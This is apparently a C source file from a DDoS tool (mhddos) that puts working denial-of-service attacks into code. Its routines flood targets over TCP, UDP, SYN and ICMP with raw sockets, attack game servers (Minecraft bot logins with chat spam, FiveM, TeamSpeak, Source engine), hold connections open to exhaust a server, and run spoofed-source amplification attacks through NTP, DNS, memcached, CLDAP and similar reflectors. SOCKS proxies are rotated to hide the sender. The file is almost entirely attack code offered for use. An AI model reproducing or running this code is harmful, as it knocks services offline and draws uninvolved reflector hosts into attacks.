#include "mhddos.h"

static int connect_proxy_socks4(const char *proxy_host, int proxy_port, const char *target_ip, int target_port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy_port);
    inet_pton(AF_INET, proxy_host, &addr.sin_addr);
    struct timeval tv = {1, 0};
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(s); return -1; }
    uint8_t req[9];
    req[0] = 0x04; req[1] = 0x01;
    req[2] = (target_port >> 8) & 0xFF; req[3] = target_port & 0xFF;
    struct in_addr ta; inet_pton(AF_INET, target_ip, &ta);
    memcpy(req + 4, &ta.s_addr, 4);
    req[8] = 0x00;
    send(s, req, 9, 0);
    uint8_t resp[8];
    if (recv(s, resp, 8, 0) < 8 || resp[1] != 0x5A) { close(s); return -1; }
    return s;
}

static int connect_proxy_socks5(const char *proxy_host, int proxy_port, const char *target_ip, int target_port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy_port);
    inet_pton(AF_INET, proxy_host, &addr.sin_addr);
    struct timeval tv = {1, 0};
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(s); return -1; }
    uint8_t hello[] = {0x05, 0x01, 0x00};
    send(s, hello, 3, 0);
    uint8_t hresp[2];
    if (recv(s, hresp, 2, 0) < 2 || hresp[1] != 0x00) { close(s); return -1; }
    uint8_t req[10];
    req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x01;
    struct in_addr ta; inet_pton(AF_INET, target_ip, &ta);
    memcpy(req + 4, &ta.s_addr, 4);
    req[8] = (target_port >> 8) & 0xFF; req[9] = target_port & 0xFF;
    send(s, req, 10, 0);
    uint8_t cresp[10];
    if (recv(s, cresp, 10, 0) < 10 || cresp[1] != 0x00) { close(s); return -1; }
    return s;
}

int open_connection_l4(const char *ip, int port, proxy_t *proxies, int proxy_count) {
    int s;
    if (proxies && proxy_count > 0) {
        proxy_t *p = &proxies[rand() % proxy_count];
        if (p->type == PROXY_SOCKS4)
            s = connect_proxy_socks4(p->host, p->port, ip, port);
        else if (p->type == PROXY_SOCKS5)
            s = connect_proxy_socks5(p->host, p->port, ip, port);
        else {
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) return -1;
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &addr.sin_addr);
            struct timeval tv = {1, 0};
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(s); return -1; }
        }
    } else {
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) return -1;
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        struct timeval tv = {1, 0};
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(s); return -1; }
    }
    if (s >= 0) {
        int one = 1;
        setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    }
    return s;
}

void flood_tcp(layer4_args_t *args) {
    while (*args->running) {
        int s = open_connection_l4(args->target_ip, args->target_port, args->proxies, args->proxy_count);
        if (s < 0) continue;
        uint8_t buf[1024];
        rand_bytes(buf, 1024);
        while (*args->running && tools_send(s, buf, 1024))
            rand_bytes(buf, 1024);
        safe_close(s);
    }
}

void flood_udp(layer4_args_t *args) {
    while (*args->running) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(args->target_port);
        inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
        uint8_t buf[1024];
        rand_bytes(buf, 1024);
        while (*args->running && tools_sendto(s, buf, 1024, &addr))
            rand_bytes(buf, 1024);
        safe_close(s);
    }
}

void flood_syn(layer4_args_t *args) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) {
        uint8_t packet[128];
        int plen;
        int sport = rand_int(32768, 65535);
        build_tcp_syn(packet, &plen, args->local_ip, args->target_ip, sport, args->target_port);
        tools_sendto(s, packet, plen, &addr);
    }
    safe_close(s);
}

void flood_icmp(layer4_args_t *args) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) return;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    uint8_t packet[2048];
    int plen;
    int dlen = rand_int(16, 1024);
    build_icmp_echo(packet, &plen, args->local_ip, args->target_ip, dlen);
    while (*args->running)
        tools_sendto(s, packet, plen, &addr);
    safe_close(s);
}

void flood_vse(layer4_args_t *args) {
    uint8_t payload[] = {0xff,0xff,0xff,0xff,0x54,0x53,0x6f,0x75,0x72,0x63,0x65,0x20,
                         0x45,0x6e,0x67,0x69,0x6e,0x65,0x20,0x51,0x75,0x65,0x72,0x79,0x00};
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) tools_sendto(s, payload, sizeof(payload), &addr);
    safe_close(s);
}

void flood_fivem_token(layer4_args_t *args) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) {
        char token[64]; rand_str(token, 36);
        long long guid = 76561197960265728LL + (rand() % (long long)(76561199999999999LL - 76561197960265728LL));
        char payload[256];
        int plen = snprintf(payload, sizeof(payload), "token=%s&guid=%lld", token, guid);
        tools_sendto(s, (uint8_t*)payload, plen, &addr);
    }
    safe_close(s);
}

void flood_fivem(layer4_args_t *args) {
    uint8_t payload[] = {0xff,0xff,0xff,0xff,'g','e','t','i','n','f','o',' ','x','x','x',0x00,0x00,0x00};
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) tools_sendto(s, payload, sizeof(payload), &addr);
    safe_close(s);
}

void flood_ts3(layer4_args_t *args) {
    uint8_t payload[] = {0x05,0xca,0x7f,0x16,0x9c,0x11,0xf9,0x89,0x00,0x00,0x00,0x00,0x02};
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) tools_sendto(s, payload, sizeof(payload), &addr);
    safe_close(s);
}

void flood_mcpe(layer4_args_t *args) {
    uint8_t payload[] = {0x61,0x74,0x6f,0x6d,0x20,0x64,0x61,0x74,0x61,0x20,0x6f,0x6e,0x74,0x6f,
                         0x70,0x20,0x6d,0x79,0x20,0x6f,0x77,0x6e,0x20,0x61,0x73,0x73,0x20,0x61,
                         0x6d,0x70,0x2f,0x74,0x72,0x69,0x70,0x68,0x65,0x6e,0x74,0x20,0x69,0x73,
                         0x20,0x6d,0x79,0x20,0x64,0x69,0x63,0x6b,0x20,0x61,0x6e,0x64,0x20,0x62,
                         0x61,0x6c,0x6c,0x73};
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    while (*args->running) tools_sendto(s, payload, sizeof(payload), &addr);
    safe_close(s);
}

void flood_ovhudp(layer4_args_t *args) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) return;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &addr.sin_addr);
    const char *methods[] = {"PGET", "POST", "HEAD", "OPTIONS", "PURGE"};
    const char *paths[] = {"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "/", "/null", "/%00%00%00%00"};
    while (*args->running) {
        int count = rand_int(2, 4);
        for (int i = 0; i < count; i++) {
            int psize = rand_int(1024, 2048);
            uint8_t rdata[2048];
            rand_bytes(rdata, psize);
            char payload_str[4096];
            int plen = snprintf(payload_str, sizeof(payload_str),
                "%s %s HTTP/1.1\nHost: %s:%d\r\n\r\n",
                methods[rand() % 5], paths[rand() % 6],
                args->target_ip, args->target_port);
            uint8_t packet[MAX_PACKET];
            int tlen;
            int sport = rand_int(1024, 65535);
            build_udp_raw(packet, &tlen, args->local_ip, args->target_ip,
                         sport, args->target_port, (uint8_t*)payload_str, plen);
            tools_sendto(s, packet, tlen, &addr);
        }
    }
    safe_close(s);
}

void flood_minecraft(layer4_args_t *args) {
    while (*args->running) {
        int s = open_connection_l4(args->target_ip, args->target_port, args->proxies, args->proxy_count);
        if (s < 0) continue;
        uint8_t hs[1024];
        int hslen = mc_handshake(args->target_ip, args->target_port, args->protocolid, 1, hs);
        uint8_t ping_pkt[16];
        uint8_t zero = 0x00;
        int pinglen = mc_data(&zero, 1, ping_pkt);
        while (*args->running && tools_send(s, hs, hslen))
            tools_send(s, ping_pkt, pinglen);
        safe_close(s);
    }
}

void flood_cps(layer4_args_t *args) {
    while (*args->running) {
        int s = open_connection_l4(args->target_ip, args->target_port, args->proxies, args->proxy_count);
        if (s >= 0) {
            atomic_fetch_add(&REQUESTS_SENT, 1);
            safe_close(s);
        }
    }
}

static void *alive_conn_thread(void *arg) {
    layer4_args_t *args = (layer4_args_t *)arg;
    int s = open_connection_l4(args->target_ip, args->target_port, args->proxies, args->proxy_count);
    if (s < 0) return NULL;
    uint8_t buf[1];
    while (recv(s, buf, 1, 0) > 0);
    safe_close(s);
    return NULL;
}

void flood_connection(layer4_args_t *args) {
    while (*args->running) {
        pthread_t t;
        pthread_create(&t, NULL, alive_conn_thread, args);
        pthread_detach(t);
        atomic_fetch_add(&REQUESTS_SENT, 1);
    }
}

void flood_mcbot(layer4_args_t *args) {
    while (*args->running) {
        int s = open_connection_l4(args->target_ip, args->target_port, args->proxies, args->proxy_count);
        if (s < 0) continue;
        char fake_ip[32];
        rand_ipv4(fake_ip, sizeof(fake_ip));
        
        uint8_t uuid_bytes[16];
        rand_bytes(uuid_bytes, 16);
        uuid_bytes[6] = (uuid_bytes[6] & 0x0f) | 0x40; /* Version 4 */
        uuid_bytes[8] = (uuid_bytes[8] & 0x3f) | 0x80; /* Variant 1 */
        
        char uuid_hex[33];
        int hp = 0;
        for (int i = 0; i < 16; i++) hp += sprintf(uuid_hex + hp, "%02x", uuid_bytes[i]);
        uuid_hex[32] = 0;

        uint8_t hs[2048];
        int hslen = mc_handshake_forwarded(args->target_ip, args->target_port,
                                            args->protocolid, 2, fake_ip, uuid_hex, hs);
        tools_send(s, hs, hslen);

        char rstr[6]; rand_str(rstr, 5);
        char username[64];
        snprintf(username, sizeof(username), "%s%s", MCBOT_PREFIX, rstr);

        uint8_t login_pkt[512];
        int llen = mc_login(args->protocolid, username, login_pkt);
        tools_send(s, login_pkt, llen);

        usleep(1500000);

        char regcmd[128], logcmd[128];
        snprintf(regcmd, sizeof(regcmd), "/register %s %s", username, username);
        snprintf(logcmd, sizeof(logcmd), "/login %s", username);

        uint8_t chat_pkt[1024];
        int cplen = mc_chat(args->protocolid, regcmd, chat_pkt);
        tools_send(s, chat_pkt, cplen);
        cplen = mc_chat(args->protocolid, logcmd, chat_pkt);
        tools_send(s, chat_pkt, cplen);

        while (*args->running) {
            char rnd[257]; rand_str(rnd, 256);
            cplen = mc_chat(args->protocolid, rnd, chat_pkt);
            if (!tools_send(s, chat_pkt, cplen)) break;
            usleep(1100000);
        }
        safe_close(s);
    }
}

void flood_amp(layer4_args_t *args) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) return;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    while (*args->running) {
        for (int i = 0; i < args->ref_count && *args->running; i++) {
            uint8_t packet[MAX_PACKET];
            int plen;
            build_udp_raw(packet, &plen, args->target_ip, args->refs[i],
                         args->target_port, args->amp_port,
                         args->amp_payload, args->amp_payload_len);
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(args->amp_port);
            inet_pton(AF_INET, args->refs[i], &addr.sin_addr);
            tools_sendto(s, packet, plen, &addr);
        }
    }
    safe_close(s);
}

void *layer4_thread(void *arg) {
    layer4_args_t *args = (layer4_args_t *)arg;
    while (!(*args->running)) usleep(10000);
    switch (args->method) {
        case METHOD_TCP: flood_tcp(args); break;
        case METHOD_UDP: flood_udp(args); break;
        case METHOD_SYN: flood_syn(args); break;
        case METHOD_ICMP: flood_icmp(args); break;
        case METHOD_VSE: flood_vse(args); break;
        case METHOD_TS3: flood_ts3(args); break;
        case METHOD_MCPE: flood_mcpe(args); break;
        case METHOD_FIVEM: flood_fivem(args); break;
        case METHOD_FIVEM_TOKEN: flood_fivem_token(args); break;
        case METHOD_OVH_UDP: flood_ovhudp(args); break;
        case METHOD_MINECRAFT: flood_minecraft(args); break;
        case METHOD_CPS: flood_cps(args); break;
        case METHOD_CONNECTION: flood_connection(args); break;
        case METHOD_MCBOT: flood_mcbot(args); break;
        case METHOD_MEM: case METHOD_NTP: case METHOD_DNS_AMP:
        case METHOD_ARD: case METHOD_CLDAP: case METHOD_CHAR:
        case METHOD_RDP: flood_amp(args); break;
        default: break;
    }
    return NULL;
}
